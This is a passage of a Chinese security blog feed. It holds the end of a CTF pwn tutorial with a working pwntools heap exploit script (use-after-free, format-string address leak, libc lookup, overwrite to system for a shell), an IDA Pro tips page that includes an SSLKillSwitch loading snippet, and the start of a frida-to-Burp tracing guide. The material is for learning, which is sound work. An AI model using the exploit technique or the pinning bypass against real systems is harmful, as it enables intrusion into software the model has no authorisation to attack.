占位chunk0 和 chunk1,申请的内容覆盖 chunk1-&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#调用的是之前留下的chunk1 然后被覆盖</span></span><br><span class="line">    delete(<span class="number">1</span>) <span class="comment"># call free -&gt; call _puts</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#step 3 leak base addr</span></span><br><span class="line">    p.recvuntil(<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> len(data)&gt;<span class="number">8</span>:</span><br><span class="line">        data=data[:<span class="number">8</span>]</span><br><span class="line">    data = u64(data.ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))<span class="comment"># leaked puts address use it to calc base addr</span></span><br><span class="line">    pwn_base_addr = data - <span class="number">0xd2d</span> <span class="comment"># 减去二进制base</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"pwn_base_addr : &#123;&#125;"</span>.format(hex(pwn_base_addr))) <span class="comment"># 找到了plt表的基地址，下面就是对于格式化字符串的利用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># free -&gt; printf</span></span><br><span class="line">    <span class="comment"># 我们首先create字符串调用delete 此时freeshort地址变成了printf，可以控制打印</span></span><br><span class="line">    <span class="comment">#step 4 get printf func addr</span></span><br><span class="line">    printf_plt = pwn.plt[<span class="string">'printf'</span>]</span><br><span class="line">    printf_addr = pwn_base_addr + printf_plt <span class="comment">#get real printf addr</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"printf_addr : &#123;&#125;"</span>.format(hex(printf_addr)))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#step 5 leak system addr</span></span><br><span class="line">    create(<span class="number">0x20</span>,payload)  <span class="comment"># 继续调用 free  -&gt; puts</span></span><br><span class="line">    delete(<span class="number">1</span>) <span class="comment">#this one can not be ignore because DynELF use the delete() at begin</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 泄露malloc_addr</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload = <span class="string">'a%9$s'</span>.ljust(<span class="number">0x18</span>,<span class="string">'#'</span>) + p64(printf_addr) <span class="comment">#覆盖chunk1的 free函数-&gt; printf</span></span><br><span class="line">    create(<span class="number">0x20</span>,payload)</span><br><span class="line">    p.recvuntil(<span class="string">"quit"</span>)</span><br><span class="line">    p.send(<span class="string">"delete "</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">    p.send(str(<span class="number">1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"?:"</span>)</span><br><span class="line">    p.send(<span class="string">"yes.1111"</span>+p64(elf.got[<span class="string">"malloc"</span>] + pwn_base_addr)+<span class="string">"\n"</span>) <span class="comment"># 触发 printf漏洞</span></span><br><span class="line">    p.recvuntil(<span class="string">'a'</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'####'</span>)[:<span class="number">-4</span>]</span><br><span class="line"></span><br><span class="line">    malloc_addr = u64(data.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">    log.info(<span class="string">"malloc_addr : &#123;&#125;"</span>.format(hex(malloc_addr)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 泄露 puts_addr</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload = <span class="string">'a%9$s'</span>.ljust(<span class="number">0x18</span>,<span class="string">'#'</span>) + p64(printf_addr) <span class="comment">#覆盖chunk1的 free函数-&gt; printf</span></span><br><span class="line">    create(<span class="number">0x20</span>,payload)</span><br><span class="line">    p.recvuntil(<span class="string">"quit"</span>)</span><br><span class="line">    p.send(<span class="string">"delete "</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">    p.send(str(<span class="number">1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"?:"</span>)</span><br><span class="line">    p.send(<span class="string">"yes.1111"</span>+p64(elf.got[<span class="string">"puts"</span>] + pwn_base_addr)+<span class="string">"\n"</span>) <span class="comment"># 触发 printf漏洞</span></span><br><span class="line">    p.recvuntil(<span class="string">'a'</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'####'</span>)[:<span class="number">-4</span>]</span><br><span class="line"></span><br><span class="line">    puts_addr = u64(data.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">    log.info(<span class="string">"puts_addr : &#123;&#125;"</span>.format(hex(puts_addr)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通过两个libc函数计算libc ,确定system_addr</span></span><br><span class="line">    <span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">    obj = LibcSearcher(<span class="string">"puts"</span>, puts_addr)</span><br><span class="line">    obj.add_condition(<span class="string">"malloc"</span>, malloc_addr)</span><br><span class="line">    <span class="comment"># obj.selectin_id(3)</span></span><br><span class="line"></span><br><span class="line">    libc_base = malloc_addr-obj.dump(<span class="string">"malloc"</span>)</span><br><span class="line">    system_addr = obj.dump(<span class="string">"system"</span>)+libc_base  <span class="comment"># system 偏移</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"system_addr : &#123;&#125;"</span>.format(hex(system_addr))) <span class="comment"># 找到了plt表的基地址，下面就是对于格式化字符串的利用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#step 6 recover old function to system then get shell</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    create(<span class="number">0x20</span>,<span class="string">'/bin/bash;'</span>.ljust(<span class="number">0x18</span>,<span class="string">'#'</span>)+p64(system_addr)) <span class="comment"># attention /bin/bash; i don`t not why add the ';'</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这些入门pwn知识的学习，对栈溢出,堆溢出,uaf的利用会有清晰的理解。对以后分析真实利用场景漏洞有很大的帮助。利用脚本尽量做的通用，考虑多个平台。那么分析利用有了，对于漏洞挖掘这方面又是新的一个课题，对于这方面的探索将另外写文章分析。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://introspelliam.github.io/2017/09/30/linux程序的常用保护机制" target="_blank" rel="noopener">linux程序的常用保护机制</a><br><a href="http://www.gandalf.site/2019/03/linux-pwn.html" target="_blank" rel="noopener">linux-pwn</a><br><a href="https://blog.csdn.net/zhy557/article/details/80832268" target="_blank" rel="noopener">https://blog.csdn.net/zhy557/article/details/80832268</a></p>
]]></content>
  </entry>
  <entry>
    <title>ida_help</title>
    <url>/2020/04/06/tips_about/ida-help/</url>
    <content><![CDATA[<p>[TOC]</p>
<!--toc-->

<a id="more"></a>

<h1 id="IDA-Pro使用技巧总结"><a href="#IDA-Pro使用技巧总结" class="headerlink" title="IDA_Pro使用技巧总结"></a>IDA_Pro使用技巧总结</h1><h2 id="IDA常见命名意义"><a href="#IDA常见命名意义" class="headerlink" title="IDA常见命名意义"></a>IDA常见命名意义</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sub 指令和子函数起点</span><br><span class="line">locret 返回指令</span><br><span class="line">loc 指令</span><br><span class="line">off 数据，包含偏移量</span><br><span class="line">seg 数据，包含段地址值</span><br><span class="line">asc 数据，ASCII字符串</span><br><span class="line">byte 数据，字节（或字节数组）</span><br><span class="line">word 数据，16位数据（或字数组）</span><br><span class="line">dword 数据，32位数据（或双字数组）</span><br><span class="line">qword 数据，64位数据（或4字数组）</span><br><span class="line">flt 浮点数据，32位（或浮点数组）</span><br><span class="line">dbl 浮点数，64位（或双精度数组）</span><br><span class="line">tbyte 浮点数，80位（或扩展精度浮点数）</span><br><span class="line">stru 结构体(或结构体数组)</span><br><span class="line">algn 对齐指示</span><br><span class="line">unk 未处理字节</span><br><span class="line">IDA中有常见的说明符号，如db、dw、dd分别代表了1个字节、2个字节、4个字节</span><br></pre></td></tr></table></figure>

<h2 id="ida-python"><a href="#ida-python" class="headerlink" title="ida python"></a>ida python</h2><p><a href="https://www.hex-rays.com/products/ida/support/idapython_docs/" target="_blank" rel="noopener">https://www.hex-rays.com/products/ida/support/idapython_docs/</a><br>idaapi模块负责访问核心IDA API<br>idc模块负责提供IDA中的所有函数功能<br>idautils模块负责提供大量实用函数，其中许多函数可以生成各种数据库相关对象的python列表</p>
<p>指定judg函数的0-181范围的字节异或0xc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">judge&#x3D;0x600B00</span><br><span class="line">for i in range(182):</span><br><span class="line">    addr&#x3D;0x600B00+i</span><br><span class="line">    byte&#x3D;get_bytes(addr,1)#获取指定地址的指定字节数</span><br><span class="line">    byte&#x3D;ord(byte)^0xC</span><br><span class="line">    patch_byte(addr,byte)#打patch修改字节</span><br></pre></td></tr></table></figure>
<p>在菜单栏中file–&gt;script file，加载python脚本</p>
<h2 id="IDA-详细插件"><a href="#IDA-详细插件" class="headerlink" title="IDA 详细插件"></a>IDA 详细插件</h2><p><a href="https://github.com/onethawt/idaplugins-list" target="_blank" rel="noopener">https://github.com/onethawt/idaplugins-list</a></p>
<h3 id="Keypatch"><a href="#Keypatch" class="headerlink" title="Keypatch"></a>Keypatch</h3><h3 id="heap-viewer-方便查堆"><a href="#heap-viewer-方便查堆" class="headerlink" title="heap-viewer 方便查堆"></a>heap-viewer 方便查堆</h3><p><a href="https://github.com/danigargu/heap-viewer" target="_blank" rel="noopener">https://github.com/danigargu/heap-viewer</a></p>
<h3 id="findcrypt-yara-查找加密"><a href="#findcrypt-yara-查找加密" class="headerlink" title="findcrypt-yara 查找加密"></a>findcrypt-yara 查找加密</h3><h3 id="FRIEND"><a href="#FRIEND" class="headerlink" title="FRIEND"></a>FRIEND</h3><p>Flexible Register/Instruction Extender aNd Documentation<br><a href="https://github.com/alexhude/FRIEND" target="_blank" rel="noopener">https://github.com/alexhude/FRIEND</a><br>重新打开 IDA，点击Edit–&gt;Plugins就可以看到FRIEND插件了。<br>/Users/shellcodepanda/Documents/panda/ida_about/ida_plugin/FRIEND/Configurations/AArch64_armv8arm_k.xml<br>导入后，选择自己想要文档化的内容，并勾选下面三个勾，允许做处理器扩展、允许显示提示、允许显示函数概要。点击 OK。</p>
<h3 id="C-filt"><a href="#C-filt" class="headerlink" title="C++filt"></a>C++filt</h3><p>可以用于显示出c++中复杂的重载后的函数名称</p>
<h3 id="strip"><a href="#strip" class="headerlink" title="strip"></a>strip</h3><p>可用于elf去符号，去符号后仍然保持正常功能但增加了逆向的难度，出题恶人必备</p>
<h3 id="比较插件"><a href="#比较插件" class="headerlink" title="比较插件"></a>比较插件</h3><h4 id="ida-bindiff-补丁比较情况"><a href="#ida-bindiff-补丁比较情况" class="headerlink" title="ida bindiff  补丁比较情况"></a>ida bindiff  补丁比较情况</h4><p>BinDiff是二进制文件的比较工具，可帮助漏洞研究人员和工程师快速找到反汇编代码中的差异和相似之处。<br>使用BinDiff，您可以识别并隔离供应商提供的修补程序中的漏洞修复程序。您还可以在同一二进制文件的多个版本的反汇编之间移植符号和注释，或使用BinDiff收集代码被盗或专利侵权的证据。</p>
<h4 id="IDA-对比-F5-显示差异-diaphora"><a href="#IDA-对比-F5-显示差异-diaphora" class="headerlink" title="IDA 对比 F5 显示差异 diaphora"></a>IDA 对比 F5 显示差异 diaphora</h4><p>Diaphora，最先进的免费开源二进制文件对比工具。<br>Diaphora是一个IDA插件，用来帮助二进制文件对比。他和其他的比较工具很类似，有一个著名的开源工具就叫做Zynamics BinDiff。还有其他的开源工具，比如DarunGrim或者是TurboDiff。但是从实际使用结果上来看，这些Diaphora能够进行更多的操作，并且能够更好地识别效果。它是在SyScan 2015期间发布的。<br>通过bindiff或者diaphora来对比不同是ida数据库，以获取函数的特征也是种很好的方法，这种方法在平时分析静态链接的程序也很有用。</p>
<h4 id="签名比较"><a href="#签名比较" class="headerlink" title="签名比较"></a>签名比较</h4><p>idb2pat.py+sigmake制作签名<br>idb2pat.py是火眼公司FireEye Labs Advanced Reverse Engineering团队编写的脚本，代码在GitHub上开源，该脚本主要通过CRC16的方式来计算每个函数块的特性，从而来识别不同的函数。这点也和IDA官方对签名文件的说明相符合，参见IDA F.L.I.R.T. Technology: In-Depth。</p>
<h4 id="Rizzo插件生成数据库识别"><a href="#Rizzo插件生成数据库识别" class="headerlink" title="Rizzo插件生成数据库识别"></a>Rizzo插件生成数据库识别</h4><p>关于rizzo，可以参看GitHub上的介绍Rizzo，同样也是一种对ida数据库进行保存然后提取信息进行对比的工具，收录于devttys0的ida脚本目录中。自己也进行了测试，速度还可以。<br>Create function signatures that can be shared amongst different projects. There are multiple sets of signatures that are generated:</p>
<h4 id="脚本扩展Sark"><a href="#脚本扩展Sark" class="headerlink" title="脚本扩展Sark"></a>脚本扩展Sark</h4><p>Sark, (named after the notorious Tron villain,) is an object-oriented scripting layer written on top of IDAPython to provide ease of use, as well as additional tools for writing advanced scripts and plugins.</p>
<p><a href="https://sark.readthedocs.io/en/latest/Installation.html" target="_blank" rel="noopener">https://sark.readthedocs.io/en/latest/Installation.html</a></p>
<p>/usr/local/bin/pip.bak install -U git+<a href="https://github.com/tmr232/Sark.git@IDA-6.x#egg=Sarks" target="_blank" rel="noopener">https://github.com/tmr232/Sark.git@IDA-6.x#egg=Sarks</a></p>
<h3 id="配色"><a href="#配色" class="headerlink" title="配色"></a>配色</h3><p><a href="https://blog.csdn.net/LPWSTR/article/details/78409727" target="_blank" rel="noopener">https://blog.csdn.net/LPWSTR/article/details/78409727</a><br><a href="https://github.com/zyantific/IDASkins" target="_blank" rel="noopener">https://github.com/zyantific/IDASkins</a><br>IDA的Edit菜单的Plugins子菜单中即可找到SkinPlugin选项，点击后在窗口中选择合适的主题<br><a href="https://github.com/0xItx/ida_nightfall" target="_blank" rel="noopener">https://github.com/0xItx/ida_nightfall</a>   汇编指令的颜色同一修改为了蓝色。</p>
<h3 id="Data-Visualization-Plugin-for-IDA-Pro"><a href="#Data-Visualization-Plugin-for-IDA-Pro" class="headerlink" title="Data Visualization Plugin for IDA Pro"></a>Data Visualization Plugin for IDA Pro</h3><p><a href="https://github.com/patois/IDACyber" target="_blank" rel="noopener">https://github.com/patois/IDACyber</a></p>
<h3 id="bap-ida-python"><a href="#bap-ida-python" class="headerlink" title="bap-ida-python"></a>bap-ida-python</h3><p>bap也不是很出名哇<br><a href="https://github.com/BinaryAnalysisPlatform/bap-ida-python" target="_blank" rel="noopener">https://github.com/BinaryAnalysisPlatform/bap-ida-python</a></p>
<h3 id="win-tools"><a href="#win-tools" class="headerlink" title="win_tools"></a>win_tools</h3><h4 id="PE-tools："><a href="#PE-tools：" class="headerlink" title="PE tools："></a>PE tools：</h4><p>是一组用于分析Windows系统中正在运行的进程和可执行文件的工具</p>
<h2 id="ida-watch"><a href="#ida-watch" class="headerlink" title="ida watch"></a>ida watch</h2><p>右键AddWatch或直接按Insert键，插入一个寄存器v0，注意大小写；<br>插入时我们需要指定变量的类型，如（String）v1，（char *）v2，（int）v3等形式类似于C++里的类型强转。这样我们才可以看到寄存器的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ida调试Dalvik显示局部变量</span><br><span class="line">(Object*)v2</span><br><span class="line">(String)v2</span><br><span class="line">(char*)v2</span><br><span class="line">(int)v2</span><br></pre></td></tr></table></figure>
<h2 id="比较二进制"><a href="#比较二进制" class="headerlink" title="比较二进制"></a>比较二进制</h2><p>/Users/shellcodepanda/Documents/panda/ida_about/ida_plugin/ida比较工具/diaphora_1.2.4_python2_ida_695_to_73/diaphora.py<br>导入后，选择生成sqlite 或者选择另一个进行比较，选择Use slow heuristics. 会比较好点。</p>
<h2 id="ida7-0-中文"><a href="#ida7-0-中文" class="headerlink" title="ida7.0 中文"></a>ida7.0 中文</h2><p>IDA string window显示中文 Options -&gt; Stings -&gt; Unicode C-style(16 bits)<br>ctrol+F5  会导出所有F5 文件 这样搜索中文？</p>
<h2 id="IDA反编译会出现问题IDA-sp-analysis-failed-不能F5"><a href="#IDA反编译会出现问题IDA-sp-analysis-failed-不能F5" class="headerlink" title="IDA反编译会出现问题IDA sp-analysis failed 不能F5"></a>IDA反编译会出现问题IDA sp-analysis failed 不能F5</h2><p><a href="http://bbs.pediy.com/thread-140002.htm" target="_blank" rel="noopener">http://bbs.pediy.com/thread-140002.htm</a><br><a href="http://blog.csdn.net/dj0379/article/details/8699219" target="_blank" rel="noopener">http://blog.csdn.net/dj0379/article/details/8699219</a><br><a href="https://reverseengineering.stackexchange.com/questions/3197/fixing-the-stackpointer-in-ida-when-exception-handlers-are-used" target="_blank" rel="noopener">https://reverseengineering.stackexchange.com/questions/3197/fixing-the-stackpointer-in-ida-when-exception-handlers-are-used</a><br><a href="http://blog.csdn.net/zhangmiaoping23/article/details/43492641" target="_blank" rel="noopener">http://blog.csdn.net/zhangmiaoping23/article/details/43492641</a><br>1.花指令patch</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">分析之后不难发现不能F5的原因,就在于跳转.</span><br><span class="line">一个函数里面的一个跳转在未知的情况下会出现不能F5.</span><br><span class="line">	</span><br><span class="line">.text:00401675 pop ebp</span><br><span class="line">.text:00401676 pop esi</span><br><span class="line">.text:00401677 pop ecx</span><br><span class="line">.text:00401678 retn</span><br><span class="line">.text:00401678 sub_4015ED endp ; sp-analysis failed</span><br><span class="line">.text:00401642 mov eax, offset loc_40164A</span><br><span class="line">.text:00401647 jmp eax</span><br><span class="line">用OD打开之后 改掉代码在保存,然后重新用IDA打开 F5就可以了,sp-analysis failed 也就消失了.</span><br><span class="line">在OD里直接改成 JMP 40164A</span><br></pre></td></tr></table></figure>
<ol>
<li>413238:positive sp value has been found<br><img src="media/15865894340527.jpg" alt=""><br>那我们就去找413238这个地址的地方，提示是说sp指针的值没有被找到，说明是这里出错了，那么就去修改sp的值，修改方法如下：<br><img src="media/15865894821928.jpg" alt=""><br>也可以使用快捷键 Alt+K</li>
<li>xxx: can analysis failed<br><img src="media/15865896765840.jpg" alt=""><br>就尝试着把报错的地址的汇编语句改一哈，改成nop，就可以解决问题</li>
</ol>
<h2 id="IDA显示-thumb"><a href="#IDA显示-thumb" class="headerlink" title="IDA显示 thumb"></a>IDA显示 thumb</h2><p>下断要减1  thumb指令<br>用IDA反汇编NDK程序的时候 发现很多程序都会反汇编错误，那是因为IDA在对 ARM反汇编的时候模式不正确。因为在动态调试 的时候，IDA并没有去解析elf模块中的一些信息，<br>造成了模块信息丢失并且反汇编就会出现错误。 这时我们可以通过更改段寄存器的值来更改反汇编模式，<br>如下图，按 “ALT+G”会出现如下窗口，把 Value 的 0x00 改为 0x01<br>0为ARM  1为 thumb</p>
<h2 id="IDA-快捷键-配置"><a href="#IDA-快捷键-配置" class="headerlink" title="IDA 快捷键_配置"></a>IDA 快捷键_配置</h2><p>ctrl+w：保存ida数据库<br>ctrl+s：选择某个数据段，直接进行跳转<br>ctrl+鼠标滚轮：能够调节流程视图的大小</p>
<p>配置IDA<br>一、ida.cfg<br><strong>SHOW_AUTOCOMMENTS</strong> 表示是否自动生成汇编指令的注释<br><strong>GRAPH_SHOW_LINEPREFIXES</strong> 表示是否在流程控制视图中显示地址<br><strong>VPAGESIZE</strong> 表示内存调整参数，当处理非常大的输入文件时，IDA可能报告内存不足而无法创建新数据库，在这种情况下增大该参数，重新打开输入文件即可解决问题<br><strong>OPCODE_BYTES</strong> 表示要显示的操作码字节数的默认值<br><strong>INDENTATION</strong> 表示指令缩进的距离<br><strong>NameChars</strong> 表示IDA支持的变量命令使用的字符集，默认是数字+字母还有几个特殊符号，如果需要添加就改变该参数<br>二、idagui.cfg<br>这个文件主要配置默认的GUI行为，键盘的快捷键等，这个很少需要修改，不做过多介绍。感兴趣的可以自己打开该文件观察，并不难懂，改改快捷键还是很容易的<br>三、idatui.cfg</p>
<p>；：在反汇编后的界面中写下注释<br>/ ：在反编译后伪代码的界面中写下注释<br>\：在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多</p>
<p>ctrl+shift+w：拍摄IDA快照<br>由于IDA不提供撤销的功能，如果你不小心按到某个键，导致ida数据库发生了改变，就得重新来过，所以要记得在经常操作的时候，加上快照：file–&gt;take database snapshot<br>加完快照后，会生成一个新的ida数据库文件，本质上是有点像另存的操作<br>生成 b00ks_20200411145256.i64</p>
<p>windows–&gt;reset desktop: 可以恢复初始ida布局</p>
<p>u：undefine，取消定义函数、代码、数据的定义</p>
<p>内存快照<br>创建完函数后，再将sub_401030函数重命名为reg_modify_401030，方便标记。然后，就到了本章重点，点击Debugger -&gt; Take memory snapshot，就可以拍摄内存快照了。<br>拍完快照后，就无需在使用调试了，直接断开远程调试功能。断开远程后，因为拍摄了内存快照，所以off_40E000这些动态变量还是保留着之前的赋值，这就是内存快照的功能，相当于你不用在虚拟机里给样本解密/脱壳，就能直接通过内存快照分析解密/脱壳后的样本。</p>
<p>函数调用图<br>菜单栏中：view–&gt;graphs–&gt;Function calls(快捷键Ctrl+F12)<br><img src="media/15865887458893.jpg" alt=""></p>
<p>导入C语言声明的结构体<br>实际上，IDA有提供一个更方便的创建结构体的方法，就是直接写代码导入<br>在View–&gt;Open Subviews–&gt;Local Types中可以看到本地已有的结构体，在该窗口中右击insert<br>可以添加新的结构体：</p>
<p>ida调试<br>F7 单步步入，遇到函数，将进入函数代码内部<br>F8 单步步过，执行下一条指令，不进入函数代码内部<br>F4 运行到光标处（断点处）<br>F9 继续运行<br>CTRL+F2 终止一个正在运行的调试进程<br>CTRL+F7 运行至返回,直到遇到RETN（或断点）时才停止.</p>
<p>ALT+M   添加标签  记录位置<br>ctrol+M  查看标签<br>IDA  ctrol F5 可以导出 函数名和 伪C代码<br>对光标处<br>C 解析为代码<br>D 解析为数据<br>A 解析为ASCII码字符串<br>U 解析为未定义的内容<br>ALT+T 搜索文本字符串<br>ALT+B 搜索十六进制字节序列</p>
<h2 id="64位参数会在函数中存在两个参数！-IDA中看到4个参数，改参数"><a href="#64位参数会在函数中存在两个参数！-IDA中看到4个参数，改参数" class="headerlink" title="64位参数会在函数中存在两个参数！ IDA中看到4个参数，改参数"></a>64位参数会在函数中存在两个参数！ IDA中看到4个参数，改参数</h2><p>signed int replace_GetRawKBSync_sub_1D060(long long  a1, int a3_11, id *a4)  IDA 中会有4个参数。</p>
<h2 id="IDA-脚本-调用函数"><a href="#IDA-脚本-调用函数" class="headerlink" title="IDA 脚本 调用函数"></a>IDA 脚本 调用函数</h2><p><a href="http://www.hexblog.com/?p=113" target="_blank" rel="noopener">http://www.hexblog.com/?p=113</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Appcall.set_appcall_options(0x0)</span><br><span class="line">api_dlopen &#x3D; Appcall.proto(LocByName(&quot;_dlopen&quot;),&quot;void *__cdecl dlopen(const char *path, int mode);&quot;)</span><br><span class="line">#print &quot;api_dlopen &#x3D; %x\n&quot;,hex(api_dlopen)</span><br><span class="line">Message(&quot;Load ssl kill\n&quot;)</span><br><span class="line">remote_sslkill_path &#x3D; &quot;&#x2F;Users&#x2F;panda&#x2F;Documents&#x2F;Github&#x2F;ssl-kill-switch2&#x2F;layout&#x2F;SSLKillSwitch.framework&#x2F;Versions&#x2F;A&#x2F;SSLKillSwitch&quot;</span><br><span class="line">api_dlopen(remote_sslkill_path, 1)</span><br><span class="line">RefreshDebuggerMemory()</span><br></pre></td></tr></table></figure>

<h2 id="ida静态分析"><a href="#ida静态分析" class="headerlink" title="ida静态分析"></a>ida静态分析</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IDA  静态分析</span><br><span class="line">ar_38&#x3D; -0x38</span><br><span class="line">var_30&#x3D; -0x30</span><br><span class="line">var_28&#x3D; -0x28</span><br><span class="line">var_20&#x3D; -0x20</span><br><span class="line">var_18&#x3D; -0x18</span><br><span class="line">var_10&#x3D; -0x10  注意这里是 - not +</span><br><span class="line">STP             X10, X11, [SP,#0xB0+var_60] 看这里   [SP,#0xB0+var_60] &#x3D; x10   [SP,#0xB0+var_58]&#x3D;x11</span><br><span class="line">STP             X9, X8, [SP,#0xB0+var_70] </span><br><span class="line">。。。。</span><br><span class="line">STUR            X0, [X29,#var_18]</span><br><span class="line">LDUR            X8, [X29,#var_8]</span><br><span class="line">LDUR            X2, [X29,#var_18]</span><br><span class="line">LDR             X0, [SP,#0xB0+var_58]</span><br><span class="line">LDR             X1, [X0] ; decodeMachOHeader</span><br><span class="line">MOV             X0, X8</span><br><span class="line">BL              _objc_msgSend</span><br></pre></td></tr></table></figure>
<h2 id="android"><a href="#android" class="headerlink" title="android"></a>android</h2><h3 id="导入ida看符号"><a href="#导入ida看符号" class="headerlink" title="导入ida看符号"></a>导入ida看符号</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$JADX_CONSOLE --output-dir-src java_dir app-release&#x2F;classes.dex</span><br><span class="line">python $make_sig -d java_dir -o method_sig.txt</span><br><span class="line">IDA use py &#x2F;Users&#x2F;shellcodepanda&#x2F;Documents&#x2F;android_tools&#x2F;ida_idc_py&#x2F;jni_helper.py</span><br><span class="line"></span><br><span class="line">dash &#96;&#96;ida_xxxx</span><br><span class="line"></span><br><span class="line">先使用ida打开要分析的程序，等ida自动分析完成，本脚本会根据jni的调用的偏移值在ida中创建两个枚举类型，支持F5插件，</span><br><span class="line">然后扫描用户的函数，根据汇编指令自动分析jni调用点，添加注释，如果遇到无法识别的指令，可以在偏移上面按m键手动设置。</span><br><span class="line">如果未成功自动识别，请按m手动设置。</span><br><span class="line">使用ALT+fn+F7 &#123;ida_jni_path&#125;</span><br></pre></td></tr></table></figure>
<h2 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">111</span><br></pre></td></tr></table></figure>
<h2 id="macos"><a href="#macos" class="headerlink" title="macos"></a>macos</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">222</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/4205#toc-0" target="_blank" rel="noopener">IDA Pro7.0使用技巧总结</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>ida</category>
        <category>tips</category>
      </categories>
      <tags>
        <tag>脚本</tag>
        <tag>tips</tag>
        <tag>ida</tag>
      </tags>
  </entry>
  <entry>
    <title>frida-trace扩展信息到burp</title>
    <url>/2020/03/13/frida_about/frida-trace-burp/</url>
    <content><![CDATA[<h1 id="frida-trace扩展信息到burp"><a href="#frida-trace扩展信息到burp" class="headerlink" title="frida-trace扩展信息到burp"></a>frida-trace扩展信息到burp</h1><p>[TOC]</p>
<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>参考原文<a href="https://cedricvb.be/post/tracing-api-calls-in-burp-with-frida/#prettyPhoto" target="_blank" rel="noopener">Tracing API calls in Burp with Frida</a></p>
<p>利用frida实现一个与burp结合实时修改二进制函数参数返回值插件。</p>
<ol>
<li>可以burp查看frida hook的值，burp有很多非常人性化的界面可以参考。</li>
<li>可以burp修改hook的参数，注入测试<ol>
<li>NSString*</li>
<li>NSData*</li>
<li>byte * or char*<a id="more"></a>

</li>
</ol>
</li>
</ol>
<h2 id="2-配置"><a href="#2-配置" class="headerlink" title="2. 配置"></a>2. 配置</h2><h3 id="2-1-frida-trace-传输到代理-127-0-0-1-26080"><a href="#2-1-frida-trace-传输到代理-127-0-0-1-26080" class="headerlink" title="2.1 frida-trace 传输到代理 127.0.0.1:26080"></a>2.1 frida-trace 传输到代理 127.0.0.1:26080</h3><ol>
<li>python3 tracer.py -m “+[EncryptUtils AESEncrypt:key:]” -Uf me.pandamac.iOSPentest</li>
<li>python3 tracer.py -m “+[EncryptUtils AESEncrypt:key:]” -f me.pandamac.iOSPentest -D c27808502c1f74e1659074e5154256360fe17f648 </li>
<li>python3 tracer.py -m  “-[EncryptUtils ret_NSData_by_bytes:byNSString:]” -f me.pandamac.iOSPentest -D c7808502c1f74e1659074e5154256360fe17f648</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> frida_tools <span class="keyword">import</span> tracer</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BURP_HOST = <span class="string">'localhost'</span></span><br><span class="line">BURP_PORT = <span class="number">26080</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">frida_process_message</span><span class="params">(self, message, data, ui)</span>:</span></span><br><span class="line">    handled = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'input'</span>:</span><br><span class="line">        handled = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</span><br><span class="line">        stanza = message[<span class="string">'payload'</span>]</span><br><span class="line">        <span class="keyword">if</span> stanza[<span class="string">'from'</span>] == <span class="string">'/request'</span>:</span><br><span class="line">            req_data = stanza[<span class="string">'payload'</span>]</span><br><span class="line">            print(req_data)</span><br><span class="line">            <span class="comment"># orig_json_data = 